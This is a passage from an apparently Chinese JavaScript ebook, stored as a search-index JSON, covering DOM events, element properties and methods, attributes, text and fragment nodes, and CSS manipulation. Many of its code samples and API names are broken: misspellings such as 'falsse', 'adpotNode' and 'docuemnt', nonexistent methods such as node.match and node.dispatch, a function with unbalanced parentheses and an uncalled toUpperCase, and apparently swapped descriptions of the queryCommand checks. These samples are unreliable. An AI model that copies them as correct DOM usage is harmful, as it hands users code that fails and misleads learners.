\u8fd9\u90e8\u5206DOM\u5b58\u5728\u4e8e\u5185\u5b58\u4e2d\uff0c\u4e0d\u5c5e\u4e8e\u5f53\u524d\u7684\u6587\u6863\uff0c\u53ef\u4ee5\u751f\u6210\u4e00\u4e2a\u590d\u6742\u7684DOM\uff0c\u7136\u540e\u4e00\u6b21\u6027\u63d2\u5165\u5230\u6587\u6863\u4e2d\uff0c\u5bf9\u8fd9\u4e2a\u6587\u6863\u7247\u6bb5\u7684\u6539\u52a8\u4e0d\u4f1a\u5f15\u53d1\u7f51\u9875\u7684\u91cd\u65b0\u6e32\u67d3\uff08\u6bd4\u76f4\u63a5\u4fee\u6539DOM\u8981\u597d\uff09\u3002\n\nvar event = document.createEvent(); \u521b\u5efa\u4e00\u4e2a\u4e8b\u4ef6\u5bf9\u8c61\nvar event = document.createEvent('Event');\nevent.initEvent('build', true, true);\ndocument.addEventListener('build', function (e) {\n  console.log(e.type); // \"build\"\n}, false);\n\u89e6\u53d1\u8fd9\u4e2a\u4e8b\u4ef6\ndocument.dispatchEvent(event);\n\nvar e = document.createEvent('Event');\ne.initEvent('click', true, true);\ndocument.addEventListener('click', function() {\n  console.log(e.type); 'build'\n}, falsse);\ndocument.dispatchEvent(e);\n\n// \u589e\u52a0\u79fb\u9664\u4e8b\u4ef6\u76d1\u542c\ndocument.addEventListener('click', listener, false);\ndocument.removeEventListener('click', listener, false);\nvar e = new Event('click');\ndocument.dispatchEvent(e); // \u89e6\u53d1\u4e8b\u4ef6\n\n\n// \u540e\u9762\u8fd9\u4e9bAPI\u57fa\u672c\u6ca1\u6709\u542c\u8fc7\u7528\u8fc7\uff0c\u73b0\u5728\u4e86\u89e3\u4e00\u4e0b\ndocument.hasFocus() \u5f53\u524d\u6587\u6863\u662f\u5426\u6709\u5143\u7d20\u6fc0\u6d3b\u6216\u8005\u83b7\u53d6\u7126\u70b9\ndocument.adpotNode() \n// adpotNode \u5c06\u67d0\u4e2a\u8282\u70b9\u53ca\u5176\u5b50\u8282\u70b9\uff0c\u4ece\u539f\u6765\u6240\u5728\u7684\u6587\u6863\u6216DocumentFragment\u91cc\u9762\u79fb\u9664\uff0c\u5f52\u5c5e\u5f53\u524ddocument\u5bf9\u8c61\uff0c\u8fd4\u56de\u63d2\u5165\u540e\u7684\u65b0\u8282\u70b9\u3002document.adoptNode\u65b9\u6cd5\u53ea\u662f\u6539\u53d8\u4e86\u8282\u70b9\u7684\u5f52\u5c5e\uff0c\u5e76\u6ca1\u6709\u5c06\u8fd9\u4e2a\u8282\u70b9\u63d2\u5165\u65b0\u7684\u6587\u6863\u6811\u3002\u6240\u4ee5\uff0c\u8fd8\u8981\u518d\u7528appendChild\u65b9\u6cd5\u6216insertBefore\u65b9\u6cd5\uff0c\u5c06\u65b0\u8282\u70b9\u63d2\u5165\u5f53\u524d\u6587\u6863\u6811\u3002\ndocument.importNode()\n// \u4ece\u539f\u6765\u6240\u5728\u7684\u6587\u6863\u6216DocumentFragment\u91cc\u9762\uff0c\u62f7\u8d1d\u67d0\u4e2a\u8282\u70b9\u53ca\u5176\u5b50\u8282\u70b9\uff0c\u8ba9\u5b83\u4eec\u5f52\u5c5e\u5f53\u524ddocument\u5bf9\u8c61\u3002\u540c\u7406\u9700\u8981\u5c06\u65b0\u8282\u70b9\u63d2\u5165\u5f53\u524d\u7684\u6587\u6863\u6811\n\ndocument.createNodeIterator() \u8fd4\u56de\u4e00\u4e2a\u5b50\u8282\u70b9\u7684\u904d\u5386\u5668\u3002\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u9700\u8981\u904d\u5386\u7684\u6839\u8282\u70b9\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u904d\u5386\u7684\u8282\u70b9\u7c7b\u578b\uff0c\u4f8b\u5982\u4e0b\u9762\u8fd4\u56de\u7684\u5c31\u662f\u5143\u7d20\u8282\u70b9\u7684\u904d\u5386\nvar nodeIterator = document.createNodeIterator(\n  document.body,\n  NodeFilter.SHOW_ELEMENT\n);\n\ndocument.createTreeWalker() \u8fd4\u56de\u4e00\u4e2a DOM \u7684\u5b50\u6811\u904d\u5386\u5668\n</code></pre> <p>\u5728\u8bbe\u8ba1\u6a21\u5f0f\u5f00\u542f\u6216\u8005\u53ef\u7f16\u8f91\u72b6\u6001\u65f6\uff0c\u53ef\u4ee5\u4f7f\u7528\u4e0b\u9762\u7684\u51e0\u79cd\u65b9\u6cd5\u6267\u884c\u6307\u4ee4</p> <p>\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u6539\u53d8\u7684\u547d\u4ee4(createLink)\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u8868\u793a\u662f\u5426\u4f7f\u7528\u9ed8\u8ba4\u7528\u6237\u754c\u9762(default\uff1afalse)\uff0c\u7b2c\u4e09\u4e2a\u53c2\u6570\u662f\u547d\u4ee4\u7684\u5177\u4f53\u503c\uff08url\uff09\u3002\u5177\u4f53\u7684\u547d\u4ee4\u5f88\u591a\uff0c\u5305\u62ec\u52a0\u7c97\u3001\u5168\u9009\u3001\u5220\u9664\u7b49\u3002\u8fd9\u4e2aAPI\u5177\u6709\u517c\u5bb9\u6027\uff0c\u6240\u4ee5\u53ef\u4ee5\u901a\u8fc7\u540e\u9762\u4e24\u4e2aAPI\u76d1\u6d4b\u67d0\u4e2a\u547d\u4ee4\u662f\u5426\u53ef\u4ee5\u4f7f\u7528\uff0c\u8fd4\u56de\u503c\u90fd\u662f\u5e03\u5c14\u503c\u3002</p> <pre><code>if (document.designMode === 'on' || node.contenteditable === true) {\n  document.execCommand(command, showDefaultUI, input);\n}\nif (document.queryCommandEnabled('SelectAll')) {\n  // \u76d1\u6d4b\u6d4f\u89c8\u5668\u662f\u5426\u517c\u5bb9\uff0cthen use this API\n}\nif (document.queryCommandSupported('SelectAll')) {\n  // \u76d1\u6d4b\u5f53\u524d\u662f\u5426\u53ef\u4ee5\u4f7f\u7528\u6478\u4e2a\u547d\u4ee4(\u4f8b\u5982\u5fc5\u987b\u9009\u4e2d\u6587\u672c\u540e\u624d\u80fd\u7ed9\u6587\u672c\u52a0\u7c97)\uff0c\u6ca1\u9009\u4e2d\u5c31\u4e0d\u80fd\u4f7f\u7528Blod\u547d\u4ee4\n}\n</code></pre> <p>document.getSelection() \u6307\u5411 window.getSelection()</p>"},{"location":"ebook-JS-basic/08-DOM/#86","title":"8.6 \u5143\u7d20\u8282\u70b9","text":"<p>\u5143\u7d20\u8282\u70b9Element Node \uff1aHTML\u6807\u7b7e\u6e32\u67d3\u6210Node\u6811\u8282\u70b9\u5c31\u662f\u5143\u7d20\u8282\u70b9\uff0cnodeType == 1\u3002\u5143\u7d20\u8282\u70b9\u662f\u591a\u79cd\u8282\u70b9\u7684\u4e00\u4e2a\u96c6\u5408\uff0c\u7ee7\u627f\u4e86Node\u8282\u70b9\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u3002</p> <p>\u5c5e\u6027</p> <p>1\u3001\u5143\u7d20\u7279\u6027\u5c5e\u6027</p> <pre><code>Element.id  \u83b7\u53d6\u5143\u7d20\u8282\u70b9\u7684ID\uff0c\u5bf9\u4e8e\u5927\u5c0f\u5199\u654f\u611f\uff0c\u53ef\u8bfb\u5199 // id='wrap'\nElement.tagName === node.nodeName === 'SPAN' \u8fd4\u56de\u8282\u70b9\u7684\u5927\u5199\u540d\u79f0\nElement.dir 'ltr' 'rtl' \u83b7\u53d6\u6587\u672c\u6392\u5217\u7684\u65b9\u5411\nELement.accessKey = 'h' \u8bbe\u7f6e\u5f53\u524d\u5143\u7d20\u7684\u5feb\u6377\u952e(Alt+h)\nelement.dragment \u5143\u7d20\u8282\u70b9\u53ef\u62d6\u62fd(\u5c5e\u6027\u53ef\u8bfb\u5199)\nelement.lang \u8fd4\u56de\u5f53\u524dHTML\u7684\u8bed\u8a00\nelement.tabIndex \u5f53\u524d\u5143\u7d20\u5728\u6309\u4e0bTab\u952e\u904d\u5386\u7684\u987a\u5e8f\uff0c\u5982\u679c\u662f-1\uff0cTab\u952e\u4e0d\u4f1a\u904d\u5386\u5230\u8fd9\u4e2a\u5143\u7d20\nelement.title \u5f53\u524d\u5143\u7d20\u7684\u6807\u9898(\u9f20\u6807\u7ecf\u8fc7\u65f6\u7cfb\u7edf\u63d0\u793a\u6587\u672c)\n</code></pre> <p>2\u3001\u5143\u7d20UI\u72b6\u6001\u5c5e\u6027</p> <pre><code>element.hidden  \u6743\u91cd\u5c0f\u4e8eCSS\u7684\u8bbe\u7f6e\uff0c\u5982\u679cCSS\u5df2\u7ecf\u8bbe\u7f6ehidden\u6216\u8005none\uff0c\u8fd9\u91cc\u65e0\u6548\nelement.contentEditable \u7528\u6237\u662f\u5426\u53ef\u4ee5\u7f16\u5199HTML(\u901a\u5e38\u662fdefault),\u8fd9\u4e2a\u5c5e\u6027\u53ef\u8bfb\u5199\nelement.isContentEditable \u8bfb\u5199\u7684\u72b6\u6001\uff0c\u4e0d\u53ef\u5199\n</code></pre> <p>3\u3001\u5143\u7d20HTML\u5c5e\u6027</p> <pre><code>element.attributes \u8fd4\u56de\u4e00\u4e2a\u5c5e\u6027\u7684\u4f2a\u6570\u7ec4\nelement.className \u8fd4\u56de\u7c7b\u540d\u7684\u5b57\u7b26\u4e32\uff0c\u4f7f\u7528\u7a7a\u683c\u5206\u5f00\nelement.classList \u8fd4\u56de\u7c7b\u540d\u7684\u4f2a\u6570\u7ec4\uff0c\u5177\u6709\u4e0b\u9762API\n    add\n  remove\n  contains\n  toggle('sf-color', true) \u8fd9\u4e2a\u5f88\u5e38\u7528\uff0c\u53ef\u4ee5\u5207\u6362\u5143\u7d20\u8282\u70b9\u7684\u6837\u5f0f\u548c\u884c\u4e3a\uff1b\u7b2c\u4e8c\u4e2a\u53c2\u6570\u53ef\u9009\uff0ctrue\u8868\u793a\u589e\u52a0\u5c5e\u6027\n  toString\n  item(0) \u8fd4\u56de\u67d0\u4e2a\u7d22\u5f15\u4f4d\u7f6e\u7684\u7c7b\u540d\n\nfoo.className += 'sf-color';\nfoo.className.replace(/^sf-color$/, '');\nfoo.classList.add('sf-color'); // \u4e0d\u662f\u6570\u7ec4\u4e0d\u80fd\u76f4\u63a5\u4f7f\u7528push\nfoo.classList.remove('sf-color');\n\nelement.dataset \u83b7\u53d6\u5143\u7d20\u8282\u70b9\u7684 data- \u5c5e\u6027\uff0c\u7ed3\u679c\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5bf9\u8c61\u53ef\u8bfb\u5199\u3002\u4f7f\u7528 getAttribute setAttribute \u540c\u6837\u53ef\u4ee5\u8bfb\u5199 data \u5c5e\u6027\u3002\u8fd9\u91cc\u53ef\u4ee5\u5b58\u653e\u65f6\u95f4\u6233\u7b49\u5c5e\u6027(\u5982\u679cID\u5df2\u7ecf\u5b58\u653e\u5176\u4ed6\u503c\uff0c\u8fd9\u91cc\u53ef\u4ee5\u5b58\u653e\u4e00\u90e8\u5206\u4fe1\u606f)\n\nelement.innerHTML \u8fd4\u56de\u8282\u70b9\u5185\u90e8\u7684HTML \u53ef\u8bfb\u5199(\u8fd9\u91cc\u8fd4\u56de\u7684\u5b57\u7b26\u4e32\u4f1a\u628a\u7279\u6b8a\u7b26\u53f7\u8f6c\u5316\uff0c\u5982\u679c\u53ea\u83b7\u53d6\u5b8c\u6574\u6587\u672c\uff0c\u53ef\u4ee5\u4f7f\u7528textContent \u5c5e\u6027)\u3002\u5f53\u8bbe\u7f6e\u4e00\u4e2a\u8282\u70b9\u7684 innerHTML \u65f6\uff0c\u5982\u679c\u53c2\u6570\u5b57\u7b26\u4e32\u5305\u542bHTML\u6807\u7b7e\uff0c\u5c31\u4f1a\u6e32\u67d3\uff0c\u5b58\u5728\u98ce\u9669\uff1b\u5305\u542b\u7684Script\u6807\u7b7e\u4e0d\u4f1a\u6267\u884c(\u5982\u679c\u4f20\u5165img\u6807\u7b7e\uff0c\u7136\u540e\u6307\u5411\u4e0d\u5b89\u5168\u7f51\u7ad9)\n\nelement.outerHTML \u8fd4\u56de\u8282\u70b9\u5185\u90e8\u7684HTML\u548c\u5f53\u524d\u8282\u70b9\u7684HTML\uff0c\u5982\u679c\u5f53\u524d\u8282\u70b9\u6ca1\u6709\u7236\u8282\u70b9(\u65b0\u521b\u5efa\u7684\u8282\u70b9)\uff0c\u4f1a\u62a5\u9519\n</code></pre> <p>4\u3001\u5143\u7d20\u5c3a\u5bf8</p> <pre><code>element.clientHeight\nelement.clientWidth \u8fd4\u56de\u5143\u7d20\u7684\u9ad8\u5ea6\u548c\u5bbd\u5ea6(\u5982\u679c\u5143\u7d20\u662f\u884c\u5185\u5143\u7d20\uff0c\u8fd4\u56de\u7684\u662f0\uff0c\u5982\u679cCSS\u4e2d\u7ed9\u5b9a\u5143\u7d20\u7684\u5c3a\u5bf8\uff0c\u8fd4\u56de\u7684\u5c31\u662f\u56fa\u5b9a\u503c\uff0c\u5426\u5219\u8fd4\u56de\u754c\u9762\u4e2d\u5b9e\u9645\u6e32\u67d3\u7684\u503c)\u5305\u62ecpadding ,\u4e0d\u5305\u62ecborder\u548c\u6eda\u52a8\u6761\u3002\n\ndocument.body.clientHeight \u7f51\u9875\u603b\u9ad8\u5ea6\ndocument.documentElement.clientHeight \u89c6\u53e3\u9ad8\u5ea6\n\nclientLeft clientTop \u8fd4\u56de\u5143\u7d20\u5de6\u8fb9\u6846\u548c\u9876\u90e8\u8fb9\u6846\u7684\u5bbd\u5ea6(\u4e0d\u5305\u62ec\u5185\u5916\u8fb9\u8ddd)\uff0c\u8fd4\u56de\u7684\u662f\u6574\u6570\n\nscrollHeight scrollWidth \u8fd4\u56de\u5143\u7d20\u7684\u603b\u9ad8\u5ea6\u548c\u603b\u5bbd\u5ea6(\u6ea2\u51fa\u9690\u85cf\u7684\u90e8\u5206\u4e5f\u4f1a\u8ba1\u7b97\uff0c\u5305\u62ec\u5185\u90e8\u7684\u4f2a\u5143\u7d20\u4f2a\u7c7b\u7684\u5c3a\u5bf8)\n\nscrollLeft scrollTop \u5143\u7d20\u6eda\u52a8\u7684\u8ddd\u79bb(\u6ca1\u6709\u6eda\u52a8\u6761\u7684\u5143\u7d20\u59cb\u7ec8\u8fd4\u56de0)\n\noffsetParent \u83b7\u53d6\u5f53\u524d\u5143\u7d20\u5916\u90e8\u7684\u4e00\u4e2a\u7236\u5143\u7d20(\u8fd9\u4e2a\u5143\u7d20position\u4e0d\u662f\u7ee7\u627f\u7684static)\uff0c\u6240\u4ee5\u7236\u5143\u7d20\u4e00\u5b9a\u8981\u76f8\u5bf9\u5b9a\u4f4d(position relative\uff0c\u5982\u679c\u662f\u7ee7\u627f\u7684\u8bdd\uff0c\u9ad8\u5ea6\u5c31\u8ba1\u7b97\u9519\u8bef\u4e86)\u5982\u679c\u5143\u7d20\u662f\u4e0d\u53ef\u89c1\u7684\uff0c\u6216\u8005\u56fa\u5b9a\u5b9a\u4f4d\uff0c\u90a3\u4e48\u7236\u5143\u7d20\u662fnull\u3002\n\noffsetWidth offsetHeight \u8868\u793a\u5143\u7d20\u7684\u9ad8\u5ea6\u548c\u5bbd\u5ea6(\u5305\u62ec\u8fb9\u754c\u548c\u6eda\u52a8\u6761)\uff0c\u53ea\u8bfb\n\noffsetLeft offsetTop \u8868\u793a\u5143\u7d20\u8ddd\u79bb\u5de6\u4fa7\u548c\u9876\u90e8\u5143\u7d20\u7684\u8ddd\u79bb\n\nelement.style \u8bbe\u7f6e\u884c\u5185\u6837\u5f0f(\u53ef\u8bfb\u5199)\n</code></pre> <p>5\u3001\u5b50\u5143\u7d20\u5c5e\u6027</p> <pre><code>element.children \u83b7\u53d6\u5b50\u8282\u70b9(\u53ea\u6709\u5143\u7d20\u7c7b\u578b\u5b50\u8282\u70b9\uff0c\u4e0d\u5305\u62ec\u6ce8\u91ca\u8282\u70b9\u6587\u672c\u8282\u70b9)\nelement.childElementCount === element.children.length\nelement.firstElementChild element.lastElementChild\nelement.nextElementSibling element.previousSibling\n</code></pre> <p>\u65b9\u6cd5</p> <pre><code>getAttribute('name');\ngetAttributeNames();\nsetAttribute('name', \"Michale\");\nhasAttribute('name');\nhasAttributes();\nremoveAttribute('name')\n\nquerySelector('#wrap, p')\nquerySelectorAll('p, div')\nnode.getElementsByClassName(''); \u7ed3\u679c\u662f\u52a8\u6001\u7684\u4f2a\u6570\u7ec4\nnode.getElementsByTagName('')\nnode.closest('div'); \u8fd4\u56de\u8ddd\u79bb\u5f53\u524d\u8282\u70b9\u7684\u6ee1\u8db3\u6761\u4ef6\u7684\u6700\u8fd1\u7684\u8282\u70b9(\u5305\u62ec\u81ea\u5df1)\nnode.match('div') return true or false\n</code></pre> <p>\u4e8b\u4ef6\u7684API <pre><code>node.addEventListener('click', function(){..});\nnode.removeEventListener('click', function(){});\nlet event = new Event('click');\nnode.dispatch(event);\n</code></pre></p> <ul> <li> <p>element.scrollIntoView(true) \u6eda\u52a8\u5f53\u524d\u5143\u7d20\u5230\u6d4f\u89c8\u5668\u7684\u53ef\u89c1\u533a\u57df\uff0c\u9ed8\u8ba4\u53c2\u6570\u662ftrue\uff0c\u8868\u793a\u5143\u7d20\u7684\u9876\u90e8\u548c\u53ef\u89c1\u533a\u57df\u7684\u9876\u90e8\u5bf9\u9f50\uff0c\u5982\u679c\u4f20\u5165\u7684\u662ffalse\uff0c\u5143\u7d20\u7684\u5e95\u90e8\u548c\u53ef\u89c1\u533a\u57df\u7684\u5e95\u90e8\u5bf9\u9f50\u3002</p> </li> <li> <p>element.getBoundingClientRect() \u8fd4\u56de\u5f53\u524d\u5143\u7d20\u5bf9\u5e94\u7684\u77e9\u5f62\u7684\u5750\u6807\u5bf9\u8c61\uff0c\u5177\u6709 x y height width left right top bottom \u8868\u793a\u5143\u7d20\u76f8\u5bf9\u4e8e\u89c6\u53e3\u7684\u4f4d\u7f6e\u3002\u8fd9\u4e9b\u5c5e\u6027\u5305\u62ec\u5185\u8fb9\u8ddd\u548c\u8fb9\u6846\u3002</p> </li> <li> <p>element.getClientRects() \u8fd4\u56de\u4e00\u4e2a\u4f2a\u6570\u7ec4\uff0c\u5c31\u662f\u5143\u7d20\u5bf9\u5e94\u77e9\u5f62\u7684\u53c2\u6570\u7684\u4f2a\u6570\u7ec4(\u4e0a\u9762\u5bf9\u8c61\u5c5e\u6027\u6784\u6210\u7684\u4f2a\u6570\u7ec4) height width left right top bottom \u8fd9\u4e2a\u65b9\u6cd5\u51b3\u5b9a\u4e8e\u884c\u5185\u5143\u7d20\u662f\u5426\u6362\u884c\uff0c\u884c\u5185\u5143\u7d20\u6bcf\u4e00\u884c\u7684\u4f4d\u7f6e\u504f\u79fb\u3002</p> </li> <li> <p>element.insertAdjacentElement(position, element); \u76f8\u5bf9\u4e8e\u5f53\u524d\u5143\u7d20\u7684\u6307\u5b9a\u4f4d\u7f6e\uff0c\u63d2\u5165\u4e00\u4e2a\u65b0\u7684\u8282\u70b9\u3002</p> </li> <li> <p>element.insertAdjacentHTML();</p> </li> <li> <p>element.insertAdjacentText(); \u5c06\u4e00\u6bb5HTML\u6216\u8005\u6587\u672c\u63d2\u5165\u4e34\u8fd1\u7684\u8282\u70b9</p> </li> <li> <p>element.remove() \u5c06\u5f53\u524d\u8282\u70b9\u4ece\u7236\u8282\u70b9\u79fb\u9664</p> </li> <li>element.focus()</li> <li>element.blur()</li> <li>element.click() \u6a21\u62df\u4e86\u4e00\u6b21\u9f20\u6807\u70b9\u51fb\uff0c\u76f8\u5f53\u4e8eclick\u4e8b\u4ef6</li> </ul>"},{"location":"ebook-JS-basic/08-DOM/#87","title":"8.7 \u5c5e\u6027\u64cd\u4f5c","text":"<p>\u5143\u7d20\u8282\u70b9\u5177\u6709\u5c5e\u6027\u96c6\u5408\uff0cattributes\uff0c\u5176\u4ed6\u8282\u70b9\u90fd\u662fnull\u3002\u5c5e\u6027\u96c6\u5408\u5bf9\u5e94HTML\u4e2d\u7684\u5404\u79cd\u5c5e\u6027\uff0c\u662f\u4e00\u4e2a\u52a8\u6001\u7684\u4f2a\u6570\u7ec4\u3002\u53ef\u4ee5\u901a\u8fc7\u4f2a\u6570\u7ec4\u7684\u4e0b\u6807\u6216\u8005\u952e\uff0c\u83b7\u53d6\u5bf9\u5e94\u7684\u503c\uff0c\u6bcf\u4e00\u9879\u662f\u952e\u503c\u5bf9\u3002\uff08id=\"wrap\"\uff09</p> <p>\u6807\u51c6\u5c5e\u6027\uff1a\u4f8b\u5982id\uff0cclass\uff0csrc\uff1b\u975e\u6807\u51c6\u5c5e\u6027\u53ef\u4ee5\u662f\u7528\u6237\u81ea\u5b9a\u4e49\u7684\u5c5e\u6027(data-*)\u3002\u81ea\u5b9a\u4e49\u5c5e\u6027\u9700\u8981\u4f7f\u7528data-\u5f00\u59cb\uff0c\u8fd9\u6837\u53ef\u4ee5\u901a\u8fc7\u9a8c\u8bc1\u3002</p> <p>\u4e00\u4e2a\u5143\u7d20\u8282\u70b9\u521b\u5efa\u51fa\u6765\u540e\u5c31\u4f1a\u5177\u6709\u6807\u51c6\u5c5e\u6027\u3002</p> <p>\u6ce8\u610f\uff0cJSX \u4e2d\u4f7f\u7528 HtmlFor, className \u4ee3\u66ff\u3002</p> <pre><code>getAttribute('id')\ngetAttributeNames()\nsetAttribute('id', 'wrap')\nhasAttribute('id')\nhasAttributes()\nremoveAttribute('wrap')\n</code></pre>"},{"location":"ebook-JS-basic/08-DOM/#88","title":"8.8 \u6587\u672c\u8282\u70b9","text":"<p>text node\u8282\u70b9\u662f\u5143\u7d20\u8282\u70b9\u548c\u5c5e\u6027\u8282\u70b9\u7684\u5b50\u8282\u70b9\uff0c\u7a7a\u683c\u4e5f\u662f\u4e00\u4e2a\u6587\u672c\u8282\u70b9\u3002</p> <p>\u5c5e\u6027</p> <pre><code>data \u7b49\u4e8e value \u8fd4\u56de\u5f53\u524d\u6587\u672c\u8282\u70b9\u7684\u5185\u5bb9(\u5b57\u7b26\u4e32)\nwholeText \u8fd4\u56de\u5f53\u524d\u6587\u672c\u8282\u70b9\u548c\u76f8\u90bb\u6587\u672c\u8282\u70b9\u5bf9\u7684\u5168\u90e8\u6587\u672c(\u5982\u679c\u6709)\nlength \u8fd4\u56de\u6587\u672c\u8282\u70b9\u7684\u957f\u5ea6\nnextElementSibling previousElementSibling \u8fd4\u56de\u540c\u7ea7\u522b\u8282\u70b9(\u5982\u679c\u6709)\n</code></pre> <p>\u65b9\u6cd5</p> <pre><code>appendData('test') \u5728\u7ed3\u5c3e\u589e\u52a0\u5b57\u7b26\u4e32\ndeleteData(startID, length)\ninsertData(startID, 'test')\nreplaceData(startID, length, 'test')\nsubstringData(startId, length) \u622a\u53d6\u5b57\u7b26\u4e32\nremove() \u79fb\u9664\u5f53\u524d\u8282\u70b9\nsplitText(position) \u5c06\u4e00\u4e2a\u6587\u672c\u8282\u70b9\u5207\u5272\u6210\u4e24\u90e8\u5206\uff0c\u53c2\u6570\u5c31\u662f\u5207\u5272\u7684\u4f4d\u7f6e\nnormalize(); \u628a\u5185\u90e8\u4e24\u4e2a\u76f8\u90bb\u6587\u672c\u8282\u70b9\u5408\u5e76\n\nlet p = docuemnt.getElementById('test');\nlet textNode = p.firstChild();\nlet newTextNode = textNode.splitText(3);\n\np.chlidNodes.length === 2\np.normalize();\np.childNodes.length === 1\n</code></pre>"},{"location":"ebook-JS-basic/08-DOM/#89","title":"8.9 \u6587\u672c\u7247\u6bb5\u8282\u70b9","text":"<p>DocumentFragment Node</p> <p>\u6587\u672c\u7247\u6bb5\u8282\u70b9\uff0c\u6ca1\u6709parentNode\uff0c\u53ef\u4ee5\u5b58\u653e\u6587\u672c\u7247\u6bb5\uff0c\u5728\u8fd9\u91cc\u5b58\u653e\u6587\u672c\u7247\u6bb5\u7684\u901f\u5ea6\u6bd4\u76f4\u63a5\u64cd\u4f5cDOM\u5feb\u901f\uff0c\u7ee7\u627f\u81eaNode\u548cparentNode\u8282\u70b9\uff0c\u6240\u4ee5\u5177\u6709\u7ee7\u627f\u7684\u5c5e\u6027\u3002children ,firstElementChildren, lastElementChilden, childElementCount \u7b49\u5c5e\u6027\u3002</p>"},{"location":"ebook-JS-basic/08-DOM/#810-css","title":"8.10 CSS\u64cd\u4f5c","text":"<p>https://wangdoc.com/javascript/dom/css.html</p> <p>\u4f7f\u7528 JS \u53bb\u64cd\u4f5c CSS \u6765\u66f4\u6539\u754c\u9762\u6837\u5f0f</p>"},{"location":"ebook-JS-basic/08-DOM/#1domcss","title":"1\u3001DOM\u64cd\u4f5cCSS","text":"<p>\u76f4\u63a5\u6539\u53d8DOM\u4e2d\u7684\u5c5e\u6027\u8282\u70b9 setAttribute('style', 'color: pink;')\uff1b\u6539\u53d8\u884c\u5185\u6837\u5f0f </p>"},{"location":"ebook-JS-basic/08-DOM/#2css-styledeclaration","title":"2\u3001CSS \u7684 StyleDeclaration \u5bf9\u8c61","text":"<p>\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u5bf9\u8c61\u7684\u5b9e\u4f8b elementNode.style \u6765\u6539\u53d8\u6837\u5f0f\uff08\u8fd9\u91cc\u7684 style \u5bf9\u8c61\u662f\u952e\u503c\u5bf9\uff0c\u952e\u9700\u8981\u9a7c\u5cf0\u547d\u540d\uff0c\u503c\u5168\u90e8\u662f\u5b57\u7b26\u4e32\uff0c\u4e0d\u80fd\u5199\u6570\u503c\uff09</p> <pre><code>let cssStyle = documenty.getElementById('wrap').style;\n\n// \u4e0b\u9762\u662fCSS\u5bf9\u8c61\u7684\u5c5e\u6027\ncssStyle.cssText = ''; // \u8fd9\u4e2a\u5c5e\u6027\u53ef\u4ee5\u83b7\u53d6\u3001\u6e05\u9664\u5168\u90e8\u884c\u5185\u5c5e\u6027\ncssStyle.length // return inner line style number\n\n// \u5b9e\u4f8b\u65b9\u6cd5\ncssStyle.getPropertyPriority('color')\n// if (color: #fff !important;) return 'important'; else return '';\ncssStyle.getPropertyValue('color') === '#fff';\ncssStyle.removeProperty('color')\ncssStyle.setProperty('color', '#fff', 'important') // important is not necessary\ncssStyle.item(0) === 'color'\n</code></pre>"},{"location":"ebook-JS-basic/08-DOM/#3css","title":"3\u3001CSS \u6a21\u5757\u7684\u4fa6\u6d4b","text":"<p>\u76d1\u6d4b\u6d4f\u89c8\u5668\u517c\u5bb9\u6027\uff0c\u5224\u65ad\u6d4f\u89c8\u5668\u67d0\u4e2a\u5c5e\u6027\u662f\u5426\u662f\u5b57\u7b26\u4e32\uff08\u5982\u679c\u652f\u6301\u8fd9\u4e2a\u5c5e\u6027\uff0c\u4f46\u662f\u6ca1\u6709\u8bbe\u7f6e\uff0c\u5c31\u4f1a\u8fd4\u56de\u4e00\u4e2a\u7a7a\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u4e0d\u652f\u6301\u5c31\u8fd4\u56deundefined\uff09\u3002</p> <pre><code>typeof cssStyle['webkitAnimation'] === 'string';\n</code></pre> <p>\u90a3\u4e48\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u51fd\u6570\u5224\u65ad\u662f\u5426\u652f\u6301\u8fd9\u4e2a\u5c5e\u6027</p> <pre><code>function isPropertySupported(property) {\n  // \u5904\u7406\u517c\u5bb9\u7684\u5c5e\u6027\n  if (property in document.body.style) {\n    return true;\n  }\n  // \u5904\u7406\u975e\u517c\u5bb9\u7684\u5c5e\u6027(\u8fd9\u91cc\u53ef\u4ee5\u83b7\u53d6\u6d4f\u89c8\u5668\u7684\u540d\u79f0\uff0c\u7136\u540e\u52a0\u4e0a\u5b9a\u5411\u524d\u7f00\uff0c\u5f53\u7136\u8fd9\u6837\u4e5f\u662f\u53ef\u4ee5\u7684)\n  var prefixes = ['Moz', 'Webkit', 'o', 'ms', 'Khtml'];\n  var prefProperty = property.charAt(0).toUpperCase + property.subStr(1);\n  for (let i = 0; i &lt; prefixes.length; i++) {\n    if ((prefixes[i] + prefProperty) in document.body.style {\n       return true;\n    }\n  }\n  return false;\n}\nisPropertySupported('background-clip')\n</code></pre>"},{"location":"ebook-JS-basic/08-DOM/#4css","title":"4\u3001CSS \u5bf9\u8c61\u7684\u9759\u6001\u65b9\u6cd5","text":"<p>CSS.escape('foo#foo') \u4f7f\u7528 document.getElementById('wrap'), \u5982\u679c\u5185\u90e8\u5b57\u7b26\u4e32\u542b\u6709\u7279\u6b8a\u5b57\u7b26\uff0c\u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\u8f6c\u6362\u540e\u53ef\u4ee5\u8fdb\u884c\u8336\u8f69\uff1bCSS.supports('width', '100px') CSS.supports('width: 100px') \u53ef\u4ee5\u76d1\u6d4b\u5f53\u524d\u73af\u5883\u662f\u5426\u652f\u6301\u8fd9\u79cd\u7c7b\u578b\u7684\u6837\u5f0f\uff0c\u7b2c\u4e8c\u79cd\u5199\u6cd5\u4e0d\u80fd\u52a0\u5165\u5206\u53f7\u3002</p>"},{"location":"ebook-JS-basic/08-DOM/#5getcomputedstyle","title":"5\u3001getComputedStyle","text":"<p>\u524d\u51e0\u79cd\u65b9\u6cd5\u662f\u83b7\u53d6\u9759\u6001\u7684\u6837\u5f0f\uff0c\u5b9e\u9645\u4e0a\u7684\u6837\u5f0f\u662f\u6d4f\u89c8\u5668\u8ba1\u7b97\u7ed3\u679c\uff0c\u8fd9\u4e2aAPI\u53ef\u4ee5\u83b7\u53d6\u8ba1\u7b97\u540e\u7684\u7ed3\u679c\u3002</p> <pre><code>let cssStyle = window.getComputedStyle(div, ':after') \n</code></pre> 